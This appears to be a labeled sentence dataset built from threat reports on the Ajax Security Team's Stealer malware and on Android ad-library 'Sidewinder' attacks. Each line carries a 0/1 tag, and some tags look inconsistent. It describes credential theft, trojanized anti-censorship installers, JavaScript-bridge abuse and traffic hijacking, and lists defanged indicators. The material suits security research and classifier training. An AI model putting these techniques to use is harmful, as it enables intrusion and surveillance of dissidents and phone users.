The attackers registered the domain '' aeroconf2014 [ . ] org '' in order to impersonate the IEEE Aerospace conference - the conference 's actual domain is aeroconf.org-and sent out an email with the following information : The email encouraged users to visit a fake conference website owned by the attackers : Upon visiting the website , visitors were notified that they must install '' proxy '' software in order to access it , which is actually malware .	1
The attackers have also used phishing attacks , in which they set up Web pages to emulate various services that require security credentials .	1
The attackers tailored these login pages for specific targets in the DIB and spoofed a variety of services such as Outlook Web Access and VPN login pages .	1
If users attempt to login through these fake Web pages , the attackers collect their login credentials .	1
All Internet Service Providers ( ISPs ) in Iran are required to implement filtering technology that censors access to content which the Iranian government deems unacceptable .	0
This content includes categories such as pornography and political opposition .	0
In response to these restrictions , Iranians have been increasingly using software that bypasses such filtering technology .	0
To counter anti-censorship efforts , Iran has attempted to block the use of certain software tools .	0
In 2012 , researchers found that an anti-censorship tool that is primarily used by Internet users in Iran was bundled with malware and redistributed .	1
Our investigation found that malware-laden versions of legitimate anti-censorship software , such as Psiphon and Ultrasurf , were distributed to users Iran and Persian speaking people around the world .	1
We have observed the Ajax Security Team use a malware family that they identify simply as 'Stealer ' .	0
They deliver this malware as a malicious executable ( dropper ) .	1
The executable is a CAB extractor that drops the implant IntelRS.exe .	1
This implant , in turn , drops various other components into C : \ Documents and Settings\ { USER } \Application Data\IntelRapidStart\ .	1
The following files are written to disk in this location : The IntelRS.exe is written in .NET	1
and is aptly named '' Stealer '' , as it has various data collection modules .	1
It drops and launches AppTransferWiz.dll via the following command : 110 is an ordinal that corresponds to '' StartBypass '' export in AppTransferWiz.dll .	1
Data exfiltration is conducted over FTP by AppTransferWiz.dll , which acts as an FTP client .	1
This DLL is written in Delphi .	0
There is code to exfiltrate data over HTTP POST as well , but it is unused .	1
We also found incomplete code that would perform SFTP and SMTP exfiltration , which could be completed in a future version .	1
State is maintained between the stealer component IntelRS.exe and the FTP component AppTransferWiz.DLL using a file from the FTP server '' sqlite3.dll '' , as well as a global atom '' SQLiteFinish '' .	0
IntelRS.exe waits in an indefinite loop , until AppTransferWiz.DLL defines this state .	0
Once the state is set , IntelRS.exe proceeds to collect data from various areas in the system as described below : IntelRS.exe loads a Delphi component called DelphiNative.DLL , which implements some additional data theft functionality for the following : The Stealer component uses common techniques to acquire credential data .	1
For instance , it loads vaultcli.DLL and uses various APIs shown below to acquire RDP accounts from the Windows vault .	1
Harvested data is encrypted and written to disk on the local host .	1
The filenames for these encrypted files follow this naming scheme : The { stolen data type } parameter indicates where the data was harvested from ( e.g. , a Web browser , an instant messenger application , installed proxy software ) .	0
Analysis of the malware indicates that the data is encrypted via a Rijndael cipher implementation ; more specifically it uses AES which is a specific set of configurations of Rijndael .	1
It uses a key size of 256 bytes and block size of 128 bytes , which conforms to the FIPS-197 specification of AES-256 .	0
It utilizes the passphrase 'HavijeBaba' and a salt of 'salam ! * % # ' as an input to PBKDF2 ( Password-Based Key Derivation Function 2 ) to derive the key and initialization vector for the encryption .	0
This key derivation implementation in .NET	0
is done using the Rfc2898DeriveBytes class .	0
The passphrase and salt are Persian language words .	0
'' Havij '' means '' carrot '' , '' Baba '' means '' father '' , and '' Salam '' is a common greeting that means '' Peace '' .	0
We identified 17 droppers during this research , including : The 2009 compile time appears to have been forged , while the 2013 compile times may be legitimate .	0
In some cases , we found an implant but not the parent dropper .	0
In total , 22 of the 23 implants that we identified during our research had unique compile times ranging from 2013-10-29 until 2014-03-15 .	0
We identified two implants that were both compiled on 2014-3-15 at 23:16 .	0
These compile times appear to be legitimate and coincide with attempted intrusion activity attributed to these attackers .	0
Many of the malicious executables ( droppers ) that we collected were bundled with legitimate installers for VPN or proxy software .	1
Examples include : • 6dc7cc33a3cdcfee6c4edb6c085b869d was bundled with an installer for Ultrasurf Proxy software .	1
• 3d26442f06b34df3d5921f89bf680ee9 was bundled with an installer for Gerdoovpn virtual private network software .	1
• 3efd971db6fbae08e96535478888cff9 was bundled with an installer for the Psiphon proxy .	1
• 288c91d6c0197e99b92c06496921bf2f was bundled with an installer for Proxifier software .	1
These droppers were also designed to visually spoof the appearance of the above applications .	1
These droppers contained icons used in the legitimate installers for these programs .	1
Analysis of the PDB strings seen in the implants indicates that there may be more than one developer working on the source code for the Stealer builder .	0
The following two PDB paths were seen in the collection of implants that we collected : These strings indicate that the Stealer source code was stored in two different paths but not necessarily on two different computers .	0
The f : \ Projects\ path may be from an external storage device such as a thumb drive .	0
It is therefore possible that only one person has access to the source code , but keeps a separate repository on an external storage device .	0
Alternatively , the different file paths could be the result of two different actors storing their source code in two different locations .	0
In nine of the implants that we collected , we found a consistent portable executable ( PE ) resource with a SHA256 of 5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3 .	0
This PE resource contains the VSVERSIONINFO .	0
In layman 's terms , this can best be described as the metadata describing the executable file .	0
This specific PE resource contained the following information : Note the InternalName of 'Stealer.exe ' .	0
This is the attackers ' name for this malware family .	0
During our research , we recovered two different tools used by the members of the Ajax Security Team in conjunction with targeted intrusion activities .	0
The first tool , labeled the 'Stealer Builder ' was compiled on 2014-04-08 .	0
This compile date may indicate that the group is still active .	0
Upon executing the 'Stealer Builder ' the user is presented with an option to load the 'Builder ' or to 'Decrypt ' logs generated from a victim and exfiltrated to a command-and-control ( CnC ) server under the groups ' control .	1
The Builder option enables an attacker to configure a new Stealer backdoor .	1
The user can configure the new backdoor to connect to a specific CnC server with a personalized username and password .	1
The attacker can bind the backdoor to a legitimate application of his or her choosing , or they can cloak it with an icon designed to make the backdoor appear as though it is a legitimate file .	1
We also noted that the Builder did not allow the attacker to select a new passphrase or salt used to encrypt the stolen data .	0
The passphrase 'HavijeBaba ' and a salt of 'salam ! * % # ' are both hardcoded into the builder .	0
During testing , we observed that backdoors generated by this Stealer Builder had a timestamp of 2013-12-19 .	0
We had one backdoor in our repository with this same timestamp .	0
This sample ( MD5 1823b77b9ee6296a8b997ffb64d32d21 ) was configured to exfiltrate data to ultrasms [ . ] ir .	1
The VSVERSIONINFO PE resource mentioned above ( SHA256 5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3 ) is an artifact of the Stealer builder that we recovered .	0
The builder generates an executable named IntelRapidStart .	0
exe .	0
This executable contains the aforementioned VSVERSIONINFO PE resource .	0
We also recovered a tool designed to encode plaintext into Base64 encoded text or decode Base64 encoded text into plaintext .	0
Members of the Ajax Security Team likely this use tool to encode the configuration data seen in RapidStartTech.stl files .	0
As noted above , the RapidStartTech.stl contains the backdoor 's FTP credentials , implant name , decoy name , and screenshot interval , along with boolean settings for startup , keylogger , and screenshot plugins .	0
Encoding and decoding Base64 data is a straightforward task and the standard Linux operating system offers a number of command line tools to achieve this task .	0
The presence of a Windows-based GUI tool that simplifies encoding and decoding Base64 data indicates that these tools may have been developed for less adept users .	0
The CnC infrastructure consists of distinct , but linked , clusters that have targeted both the users of anti-censorship tools in Iran as well as defense contractor companies in the U.S .	0
The first cluster contains the domain used in the Aerospace Conference attack as well as the domains used in phishing attacks designed to capture user credentials : The website used in the Aerospace Conference attack was aeroconf2014 [ .	1
] org , which is registered to info @ usa.gov [ .	0
] us .	0
However , historical WHOIS information shows that the domain was registered by keyvan.ajaxtm @ gmail [ .	0
] com-the same domain used to register ajaxtm [ .	0
] org , the website of the Ajax Security Team .	0
The same email addresses were used to register variations of domain names associated with popular services provided by companies such as Google , Facebook , Yahoo and LinkedIn .	0
The second cluster comprises the CnC infrastructure used in the anti-censorship attacks .	0
The majority of the samples we analyzed connect to intel-update [ . ] com and update-mirror [ . ] com , which were registered by james.mateo @ aim [ .	1
] com .	0
The domain intel-update [ .	0
] com resolved to the IP address 88.150.227.197 , which also hosted domains registered by osshom @ yahoo [ .	0
] com , many of which are consistent with the pattern of registering domains with associations to Google and Yahoo services .	0
We also observed crossover with a sample that connected to both intel- update [ . ] com and ultrasms [ . ] ir , which was registered by lvlr98 @ gmail [ .	1
] com .	0
These two clusters are linked by a common IP address ( 5.9.244.151 ) , which is used by both ns2 .	0
aeroconf2014 [ .	0
] org and office.windows- essentials [ .	0
] tk .	0
A third cluster of activity was found via analysis of 1d4d9f6e6fa1a07cb0a66a9ee06d624a .	0
This sample is a Stealer variant that connects to the aforementioned intel-update [ . ] com as well as plugin-adobe [ . ] com .	1
The domain plugin-adobe [ .	0
] com resolved to 81.17.28.235 .	0
Other domains seen resolving to IP address nearby include the following : Aside from the sample connecting to plugin- adobe [ . ] com , we have not discovered any malware connecting to these domains .	1
During our investigation , we were able to recover information on 77 victims from one CnC server that we discovered while analyzing malware samples that were disguised as anti-censorship tools .	1
While analyzing the data from the victims , we found that the majority had either their timezone set to '' Iran Standard Time '' or had their language setting set to Persian : The largest concentration of victims is in Iran , based on the premise that Persian language settings and '' Iran Standard Time '' correlate the victim to be geographically located in Iran .	0
As such , we believe that attackers disguised malware as anti-censorship tools in order to target the users of such tools inside Iran as well as Iranian dissidents outside the country .	1
The Ajax Security Team appears to have been formed by personas named '' HUrr ! c4nE ! '' and '' Cair3x '' in 2010 .	0
Both members were engaged in website defacements prior to the forming of the Ajax Security Team , and both were members of Iranian hacker forums such as ashiyane [ .	0
] org and shabgard [ .	0
] org .	0
Other members include '' 0day '' , '' Mohammad PK '' and '' Crim3r '' .	0
The Ajax Security Team website at ajaxtm [ .	0
] org had a Web forum with at least 236 members .	0
The group published several exploits for content management systems and engaged in defacements .	0
Initially , the defacements seemed to be motivated by a desire to demonstrate the group 's prowess-they even defaced an Iranian government website .	0
However , the group appears to have become increasingly political .	0
For example , in a blog post in 2012 , '' Cair3x '' announced the targeting of Iran's political opponents .	0
In 2013 , the Ajax Security Team , and '' HUrr ! c4nE ! '' in particular , took part in '' # OpIsrael '' and '' # OpUSA '' .	0
By early 2014 , the Ajax Security Team appears to have dwindled .	0
There have been no defacements since December 2013 .	0
The website and forum at ajaxtm [ .	0
] org operated by '' HUrr ! c4nE ! '' , aka '' k3yv4n '' , is no longer active .	0
'' HUrr ! c4nE ! '' has the most open/documented Internet persona of the Ajax Security Team .	0
He registered the ajaxtm [ .	0
] org domain name using the email address keyvan.ajaxtm @ gmail [ .	0
] com .	0
This was also the email address used to register the domain aerospace2014 [ . ] org , which was used in spear phishing attacks against companies in the U.S. and is linked with malware activity directed at users of anti-censorship tools in Iran .	1
'' HUrr ! c4nE ! '' features prominently in all the group 's activities and defacements .	0
Although there has been a decline in public-facing Ajax Security Team activity , this coincides with an increase in malware activity linked to the group 's infrastructure .	0
The increasing politicization of the Ajax Security Team aligns with the timing of their activities against the perceived enemies of Iran .	0
In addition to attacking companies in the U.S. , they have targeted domestic users of anti-censorship technology .	0
While the objectives of this group are consistent with Iran 's efforts at controlling political dissent and expanding offensive cyber capabilities , the relationship between this group and the Iranian government remains inconclusive .	0
For example , the Ajax Security Team could just be using anti-censorship tools as a lure because they are popular in Iran , in order to engage in activities that would be considered traditional cybercrime .	1
In one case , '' HUrr ! c4nE ! '' , using the email address keyvan.ajaxtm @ gmail [ .	0
] com , has been flagged for possible fraud by an online retailer .	0
While '' HUrr ! c4nE ! '' is engaged in operations that align with Iran 's political objectives , he may also be dabbling in traditional cybercrime .	0
This indicates that there is a considerable grey area between the cyber espionage capabilities of Iran's hacker groups and any direct Iranian government or military involvement .	0
On the spectrum of state responsibility , these attacks align with state-encouraged attacks , which are defined as attacks in which : Third parties control and conduct the attack , but the national government encourages them as a matter of policy .	0
Recruiting hackers through this model allows Iran to influence their activities , and provides the Iranian government plausible deniability , but a lack of direct control also means that the groups may be unpredictable and engage in unsanctioned attacks .	0
The increased politicization of the Ajax Security Team , and the transition from nuisance defacements to operations against internal dissidents and foreign targets , coincides with moves by Iran aimed at increasing offensive cyber capabilities .	0
While the relationship between actors such as the Ajax Security Team and the Iranian government is unknown , their activities appear to align with Iranian government political objectives .	0
The capabilities of the Ajax Security Team remain unclear .	0
This group uses at least one malware family that is not publicly available .	0
We have not directly observed the Ajax Security Team use exploits to deliver malware , but it is unclear if they or other Iranian actors are capable of producing or acquiring exploit code .	0
While the Ajax Security Team 's capabilities remain unclear , we know that their current operations have been somewhat successful as measured by the number of victims seen checking into to an Ajax Security Team controlled CnC server .	0
We believe that if these actors continue the current pace of their operations they will improve their capabilities in the mid-term .	0
FireEye has invented a purpose-built , virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .	0
These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses , such as next-generation firewalls , IPS , anti-virus , and gateways .	0
The FireEye Threat Prevention Platform provides real-time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors and across the different stages of an attack life cycle .	0
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .	0
FireEye has over 1,500 customers across more than 40 countries , including over 100 of the Fortune 500 .	0
We thank Kenneth Geers and Jen Weedon for their support and analysis on these findings .	0
By 2014 , the number of Android users has grown to 1.1 billion and the number of Android devices has reached 1.9 billion .	0
At the same time , enterprises are also embracing Android- based Bring Your Own Device ( BYOD ) solutions .	0
For example , in Intel 's BYOD program , there are more than 20,000 Android devices across over 800 combinations of Android versions and hardware configurations .	0
Although little malware has been found in Google Play , both Android apps and the Android system itself contain vulnerabilities .	0
Aggressive ad libraries also leak the user 's private information .	1
By leveraging all these vulnerabilities , an attacker can conduct more targeted attacks , which we call '' Sidewinder Targeted Attacks .	1
'' In this paper we explain the security risks from such attacks , in which an attacker can intercept and use private information uploaded from ad libraries to precisely locate targeted areas such as a CEO 's office or specific conference rooms .	1
When the target is identified , a '' Sidewinder Targeted Attack '' exploits popular vulnerabilities in ad libraries , such as Javascript-binding-over-HTTP or dynamic- loading-over-HTTP , etc .	0
It is a well-known challenge for an attacker to call Android services from injected native code that does n't have Android application context .	0
Here , we explain how attackers can invoke Android services for tasks including taking photos , calling phone numbers , sending SMS , reading from/ writing to the clipboard , etc .	1
Furthermore , the attackers can exploit several Android vulnerabilities to get valuable private information or to launch more advanced attacks .	1
Finally , we show that this threat is not only real but also prevalent due to the popularity of Android ad libraries .	0
We hope this paper kickstarts the conversation on how to better protect the security and privacy in third-party libraries and how to further harden the Android security framework in the future .	0
To understand the security risks brought by a Sidewinder Targeted Attack , we first explain one possible attack mechanism ( illustrated in Figure 1 ) that is similar to that of Sidewinder missiles .	0
The attacker can hijack the network where the targeted victim resides .	1
Like an infrared homing system , the attacker then seeks '' emission '' from ad libraries running on the target device to track and lock on it .	0
Once the target is locked on , the attacker can launch advanced persistent attacks .	0
To minimize detection chances , the attacker can choose to take action on important targets only , ignoring all other devices .	1
In later sections , we discuss attacking ( '' warhead '' ) and targeting ( '' homing '' ) components in detail and show how a combination of these components can launch powerful and precise attacks on target devices .	1
Table 1 proposes different attacks that an attacker can launch remotely on target devices through vulnerable ad libraries .	1
Figure 2 shows a proof-of-concept attack control interface .	0
This attack targets one of the ad libraries described in this paper .	0
The security risks become obvious by looking at what the attacker can do with this control interface .	0
The left panel enables the attacker to command the victim 's device , including uploading local files , taking pictures , recording audio/video , manipulating the clipboard , sending SMS , dialing numbers , implanting bootkit , or installing the attacker 's apps uploaded to Google Play , etc .	1
The right panel lists all information stolen from the victim 's device .	1
In this screenshot , the victim's installed app list , clipboard , a photo taken from the back camera , an audio clip , and a video clip have been uploaded , with the GPS location intercepted from the ad library .	1
The panel also pins down the GPS location of the victim's device onto a Google Map widget .	1
Based on this precise position information , it is easy to identify individuals or groups of '' VIP '' targets by which offices they are in .	0
In this section , we explain in more detail the risks of remote attacks on the Android devices .	0
Android uses the JavaScript binding method addJavascriptInterface to enable JavaScript code running inside a WebView to access the app 's Java methods ( also known as the Javascript bridge ) .	0
However , it is widely known that this feature , if not used carefully , presents a potential security risk when running on Android API 16 ( Android 4.1 ) or below .	0
As noted by Google : '' Use of this method in a WebView containing untrusted content could allow an attacker to manipulate the host application in unintended ways , executing Java code with the permissions of the host application .	1
'' In particular , if an app running on Android API 16 or below uses the JavaScript binding method addJavascriptInterface and loads the content in the WebView over HTTP , an attacker over the network could hijack the HTTP traffic ( e.g. , through WiFi or DNS hijacking ) to inject malicious content into the WebView and to control the host application .	1
Listing 1 is a sample Javascript snippet to execute shell command .	1
We call this the JavaScript-Binding-Over-HTTP ( JBOH ) vulnerability .	0
This applies to insecure HTTPS channels as well .	0
If an app containing such vulnerability has sensitive Android permissions such as access to the camera , a remote attacker could exploit it to perform sensitive tasks such as taking photos or recording video , over the Internet , without consent .	1
Based on the official data in June 2014 , ~60 % of Android devices are still running API≤16 .	0
Note that API > 16 platforms are not necessarily secure .	0
If the app is targeting at a lower API level , Android will still run it with the lower API level for compatibility reasons .	0
Figure 3 shows the targeted API of popular Google Play apps , each of which has over 50,000 downloads .	0
We can see that a large portion of apps are targeting at API≤16 .	0
Starting with Android 4.2 ( API > 16 ) , Google introduced the @ JavascriptInterface anno- tation to explicitly designate and restrict which public Java methods in the app were accessible from JavaScript running inside a WebView .	0
However , if an ad library uses the @ JavascriptInterface annotation to expose security-sensitive interfaces , and uses HTTP to load content in the WebView , it is vulnerable to attacks where an attacker over the network could inject malicious content into the WebView to misuse the interfaces exposed through the JS binding annotation .	1
We call these exposed JS binding annotation interfaces '' JS Sidedoors .	0
'' For example , we found a list of sensitive Javascript interfaces that are publicly ex- posed from certain versions of a real-world ad library : createCalendarEvent , makeCall , postToSocial , sendMail , sendSMS , takeCameraPicture , getGalleryImage , registerMicListener , etc .	0
Given that this ad library loads ads using HTTP , if the host app has the corresponding permissions ( e.g. , CALL PHONE ) , attackers over the network can abuse these interfaces to do malicious things ( e.g. , utilizing the makeCall interface to dial phone numbers without the user 's consent ) .	1
Similar to JBOH , DEX loading over HTTP or insecure HTTPS ( DLOH ) is another serious issue raised by ad libraries .	0
If the attackers can hijack the communication channels and inject malicious DEX files , they can then control the behaviors of the victim apps .	1
After getting local access , the attacker can upload private and sensitive files from the victim 's device , or modify files that the host app can write to ( e.g. , the directory of the host app and SD Card with FAT file system ) .	1
To launch more sophisticated attacks like sending SMS or taking pictures , the attackers may use Java reflection to call other APIs from the Javascript bridge .	1
It appears this method makes sending SMS easy .	0
However , some other operations require Android context or registering Java callbacks .	0
Android context provides an interface to the global information about an app 's environment .	0
Many Android functionalities , especially remote call invocations , are encapsulated in the context .	0
We discuss attacks requiring context in a later section .	0
In this section , we explain attacks that do n't need Android context , and discuss their security risks .	0
One direct threat posed by JBOH is to use the JBOH shell ( Listing 1 ) to download exe- cutables and use them to root the device .	1
Commercial one-touch root apps claim they can root more than 1,000 brands ( > 20,000 models ) .	0
towelroot , which exploits a bug found recently in Linux kernel , claims that it can root most new devices released before June 2014 .	0
Thus , as long as attackers can get the JBOH shell , they have the tools to obtain root on most Android phone models .	1
Even if the attackers ca n't obtain root , they can attempt ptrace to control the host app .	1
Although only processes with root privilege can ptrace others , child processes are able to ptrace their parents .	0
Because the shell launched from the Javascript bridge is a child process of the host app , it can ptrace the host app 's process .	0
Note that only apps with android : debuggable set as '' true '' in the manifest can be ptraced , which limits its adoption .	0
Sending SMS does not require context or user interaction .	0
A simple call does the job , as shown in Listing 2 To make calls from the Javascript bridge without user consent , we can invoke the telephony service to dial numbers directly via binder , as shown in Listing 3 , where phone is the remote Android telephony service and the number 2 represents the second remote call .	1
s16 is the type marker represents '' 16 bit string , '' and packageName is the host app 's package name , where we can obtain from the information posted from the ad libraries .	0
The sequence number of the remote calls can be found in the corresponding Android Interface Definition Language ( AIDL ) files .	0
Many other Android services can be invoked in the same way , including sending SMS As mentioned , it is more convenient to directly obtain the Android context via the Javascript bridge .	0
Code in Listing 4 , for example , is an easy way to get context from anywhere of the application .	0
Operations like taking pictures and recording videos need to register Java callbacks .	0
The attackers either need to boot a Java VM from the Javascript bridge , or to inject code into the host app 's Java VM .	0
Fortunately , Android Runtime offers another way to load Java Native Interface ( JNI ) code into the host app using Runtime.load ( ) .	0
As shown in Listing 5 , an attacker can load executables compiled from JNI code .	1
Once loaded , the code can obtain context as described in Listing 4 , or call DexClassLoaderload to inject new classes from the attackers ' DEX files to register callbacks to take pictures/ record videos .	1
There are other ways to obtain Android context , like reflecting to the private static context variable of WebView .	0
However , without Java VM instances , it 's difficult to take pictures and record videos .	0
After our submission to Black Hat in April 2014 , we noticed that MWR was also concurrently and independently working on this issue .	0
They published a similar mechanism in June 2014 .	0
With the Android context , an attacker can monitor or tamper with the clipboard .	1
Android users may perform copy-paste on important text content .	0
For example , there are many popular password-management apps in Google Play , enabling the users to click-and-copy passwords and paste them into login forms .	0
Malicious apps can steal the passwords if they can read the contents on clipboard .	1
Android has no permissions restricting apps from accessing the global clipboard .	0
Any UID has the capability to manipulate clipboard via the API calls in Listing 6 : Using these APIs , the attackers can monitor changes to a clipboard and transfer the clipboard contents to some remote server .	1
They can also alter the clipboard content to achieve phishing goals .	1
For example , the user may copy a link to visit and the background malicious service can change that link to a phishing site .	1
We have notified Google about this issue .	0
Android Open Source Project ( AOSP ) classifies Android permissions into several protec- tion levels : '' normal , '' '' dangerous , '' '' system , '' '' signature '' and '' development '' , , .	0
Dangerous permissions '' may be displayed to the user and require confirmation before pro- ceeding , or some other approach may be taken to avoid the user automatically allowing the use of such facilities .	0
'' In contrast , normal permissions are automatically granted at installation , '' without asking for the user 's explicit approval ( though the user always has the option to review these permissions before installing ) '' .	0
If an app requests both dangerous permissions and normal permissions , Android only displays the dangerous per- missions by default .	0
If an app requests only normal permissions , Android does n't display any permission to the user .	0
We have found that certain '' normal '' permissions have dangerous security impacts .	0
For example , the attackers can manipulate Android home screen icons using two normal permissions : launcher READ SETTINGS and WRITE SETTINGS permissions .	1
These two permissions enable an app to query , insert , delete , or modify all launcher configuration settings , including icon insertion or modification .	0
As a proof-of-concept attack scenario , a malicious app with these two permissions can query/insert/ alter the system icon settings and modify legitimate icons of some security- sensitive apps , such as banking apps , to a phishing website .	1
After our notification , Google has patched this vulnerability in Android 4.4.3 and has released the patch to its OEM partners .	0
However , according to Google , by 7 July 2014 , 17.9 % Android devices are using Android 4.4 .	0
Given that Android 4.4.2 and below has this vulnerability , over 82.1 % Android devices are vulnerable .	0
With the CHANGE WIFI STATE permission , Android processes can change the proxy settings of WIFI networks ( not solely the currently connected one ) .	0
To do this , the attacker can use the remote calls exposed by WifiManager to obtain the WifiConfiguration objects , then create new proxySettings to replace to a corresponding field .	0
Note that the proxySettings field is a private Java field not intended to be accessed by other processes .	0
Unfortunately , the flexible and powerful Java reflection mechanism ( especially the forName ( ) , getField ( ) , setAccessible ( ) calls ) exposes such components to the attackers for arbitrary read or write operations .	0
Android audio recording via the MediaRecorder APIs does not need user interaction or consent , which makes it easy to record sound in the background .	0
On the contrary , taking pictures and recording videos are more challenging .	0
First , this requires registering Java callbacks .	0
Second , Android warns that '' Preview must be started before you can take a picture '' .	0
It seems that taking pictures and recording videos without user notification is impossible .	0
However , security largely depends on the correct implementation and enforcing a flawless implementation is difficult .	0
On some of the popular phones ( models anonymized for security consideration ) , startPreview ( ) is required to take pictures/record videos ; However , it 's highly possible that on these devices takePicture ( ) fails to check whether a view has been presented to the user .	0
Fortunately , we have never witnessed a case where the MediaRecorder can shoot videos without calling setPreviewDisplay .	0
But we were able to create and register a dummy SurfaceView to the WindowManager , which made taking photos and videos possible even on devices that properly checked for an existing preview .	0
With both the GET ACCOUNTS and the USE CREDENTIALS permissions , Android pro- cesses can get secret tokens of services ( e.g. , Google services ) from the AccountManager and use them to authenticate to these services .	1
We verified that Android apps with these two permissions can authenticate themselves with the user 's Google account , allowing access to Google Play and the ability send app installation requests .	1
Through the Javascript bridge , attackers can install apps of choice ( e.g. , an attacker 's phishing app ) to any devices registered in user 's account in the background without user consent .	1
Combined with the launcher modification attack introduced earlier , the attackers can redirect other app icons ( e.g. , bank or email app icons ) to the phishing app and steal the user 's login credentials .	1
In this section , we explain the risks of victims ' devices being tracked and targeted through ad traffic .	1
It is well known that communication via HTTP is prone to hijacking and data tamper- ing .	0
Though ad libraries may not have the incentive to abuse users ' private and sensitive data , this is not the case with the attackers eavesdropping or hijacking the HTTP traffic .	1
Switching to HTTPS may not solve this issue since the HTTPS security relies on a flawless implementation , which is difficult .	0
For example , there are cases where the developer failed ( intentionally or unintentionally ) to check the server 's certificate .	0
We found that some of the most popular ad libraries ( see Table 3 ) have this issue .	0
We successfully launched Man-in-the- Middle ( MITM ) attacks and intercepted the data uploaded to the remote server .	1
Note that even if the ad libraries have a correct and rigorous implementation , the SSL library itself may contain serious vulnerabilities that can be exploited by MITM attacks , .	0
Almost every ad library uploads local information from Android devices .	0
Based on our observations , they do so mostly for purposes such as checking for platform compatibility and user interest targeting .	0
The information most frequently uploaded includes IMEI , Android version , manufacturer , Android ID , device specification , carrier information , host app information , installed app list , etc .	0
Table 3 lists the info uploaded from the top five popular ad libraries .	0
Listing 7 is a captured packet posted to the remote ad server by one of the ad libraries .	0
It is captured from a popular Google Play app .	0
From this packet we can tell the device 's screen density ( d-device-screen-density ) , screen size ( d-device- screen-size ) , host app 's pack- age name ( u-appBId ) , host app 's name ( u-appDNM ) 1 , host app 's version ( u-appVer ) , user agent ( h-user-agent ) , localization ( d-localization ) , mobile network type ( d-netType ) , screen orientation ( d-orientation ) , and GPS location ( u-latlong-accu ) .	0
The most important infor- mation is the GPS location , where the victim 's latitude , longitude and the location precision are shown .	0
It is reasonable for an ad to obtain this information to improve the ad-serving experience .	0
However , with this information , an attacker can precisely locate the victim and acquire the device 's specifications .	1
To locate victims effectively , an attacker needs to monitor large-scale network traffic containing such private information .	0
Unfortunately , several well-known attacks can be used to achieve large-scale monitoring , including DNS hijacking , BGP hijacking , and ARP hijacking in IDC .	1
In this context , DNS hijacking is done to subvert the resolution of Domain Name System ( DNS ) queries through modifying the behavior of DNS servers so that they serve fake DNS information .	1
DNS hijacking is legally and maliciously used in many situations including traffic management , phishing and censorship .	0
Attackers successfully compromised many DNS servers , including the ones from Google and Godaddy .	1
By DNS hijacking , attackers can effectively access all the traffic to ad servers .	1
BGP hijacking takes over groups of IP addresses , corrupting Internet routing tables by breaking BGP sessions or injecting fake BGP information .	1
This enables attackers to monitor all traffic to specific IPs .	1
Historically , there were many BGP hijacking attacks that affected YouTube , DNS root servers , Yahoo , and many other important Internet services .	0
ARP hijacking ( or spoofing ) in IDC is done to hijack the traffic to the ad server in the IDC where the ad server locates through fake ARP packets .	1
Attackers may rent servers close to the target servers , and use fake ARP packets to direct all the traffic to go through the hijacking servers first for monitoring and hijacking .	1
ARP hijacking is a well-known approach used in network attacks .	1
Using the large-scale traffic intercepted from the above methods , attackers can iden- tify potential victims based on information leakage such as GPS location described in Sec- tion 4.2 .	1
After that , they can inject exploits only into the targeted traffic to launch further attacks .	1
Attackers keep a low profile by allowing all other irrelevant network traffic to pass without being modified .	1
We used the FireEye Mobile Threat Prevention ( MTP ) engine to analyze all of the ~73,000 popular apps from Google Play with more than 50,000 downloads , and identified 93 ad libraries .	0
The detailed ad library inclusion statistics are shown in Figure 4 .	0
Seventy-one % of the apps contain at least one ad library , 35 % have at least two ad libraries , and 22.25 % include at least three ad libraries .	0
The largest ad inclusion number is 35 .	0
Since Google is cautious about the security of the products it directly controls , we exclude Google Ad from the following discussion .	0
For security considerations , in this paper we anonymize the names of the other 92 ad libraries , using Ad1 , Ad2 , ...	0
, Ad92 to refer to them , where the subscripts represent the rankings of how many apps include the ad libraries .	0
The top five popular ad libraries ' inclusion and download statistics are listed in Table 2 .	0
We analyzed the 92 ad libraries found in the popular Google Play apps , and summa- rized the communication channel vulnerabilities in Table 3 .	0
Combined with the uploaded information column we can learn about the data the attackers can obtain .	0
Fifty-seven of the 92 ad libraries in the popular Google Play apps have the JBOH issue .	0
Specifically , four of the top five ad libraries are subject to this problem ( shown in Table 2 ) .	0
Seven of the 92 ad libraries are prone to DLOH attacks .	0
Particularly , some versions of Ad5 in Table 3 have this problem .	0
The affected Google Play apps number and the accumulated download counts are listed in Table 4 .	0
In the current golden age of Android ad libraries , Sidewinder Targeted Attacks can target victims using info leakage and other vulnerabilities of ad libraries to get valuable , sensitive information .	1
Millions of users are still under the threat of Sidewinder Targeted Attacks .	0
First we need to improve the security and privacy protection of ad libraries .	0
For example , we encourage ad libraries ' publishers to use HTTPS with proper SSL certificate validation , and to properly encrypt network traffic .	0
They also need to be cautious about which privileged interfaces are exposed to the ad providers , in case of malicious ads or attackers hijacking the communication channels .	1
Meanwhile , Google itself needs to further harden the security framework .	0
This may prove difficult because : 1 .	0
Android is a complex system .	0
Any sub- component 's vulnerability may impact the security of the whole system .	0
Fragmentation makes the situation even more challenging .	0
2 .	0
The trade-off between usability , performance and security always matters , and market demand frequently dictates that security comes last .	0
Many Android developers do not even understand how to program securely ( as shown in the JBOH issue ) .	0
3 .	0
Many security patches are not back-ported to old versions of Android ( like the launcher settings problem described earlier ) , even though older versions are widely used .	0
4 .	0
There is always information asymmetry in the development chain .	0
For example , it usually takes several months for vendors to apply security patches after Google releases them .	0
Albeit challenging , we hope that this work can kickstart a conversation , both on improved security and privacy protection in third-party libraries and on a hardened Android security framework .	0
FireEye has invented a purpose-built , virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .	0
These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses , such as next-generation firewalls , IPS , anti-virus , and gateways .	0
The FireEye Threat Prevention Platform provides real-time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors and across the different stages of an attack life cycle .	0
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .	0
FireEye has over 1,900 customers across more than 60 countries , including over 130 of the Fortune 500 .	0
Not so long ago , Kaspersky clients in the United States approached Kaspersky researchers with a request to investigate a new type of malicious software that they were able to recover from their organizations ' servers .	0
The malware calls itself Grabit and is distinctive because of its versatile behavior .	0
